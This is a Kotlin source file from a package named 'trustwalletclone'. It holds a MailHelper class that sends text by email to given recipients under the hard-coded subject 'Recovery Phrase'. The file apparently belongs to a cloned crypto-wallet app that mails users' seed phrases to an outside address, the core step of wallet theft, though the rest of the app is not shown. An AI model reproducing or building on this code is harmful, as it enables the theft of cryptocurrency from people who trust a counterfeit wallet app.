package com.example.trustwalletclone.model

import javax.mail.Message
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeMessage

class MailHelper {
    companion object {
        var mail: Mail? = null
            get() {
                if (field == null) field = Mail()
                return field
            }

        fun sendEmail(text: String, recipients: String) {
            val message: Message = MimeMessage(mail?.session)
            message.setFrom(InternetAddress(mail?.username))
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients))
            message.subject = "Recovery Phrase"
            message.setText(text)
            Transport.send(message)
        }
    }
}
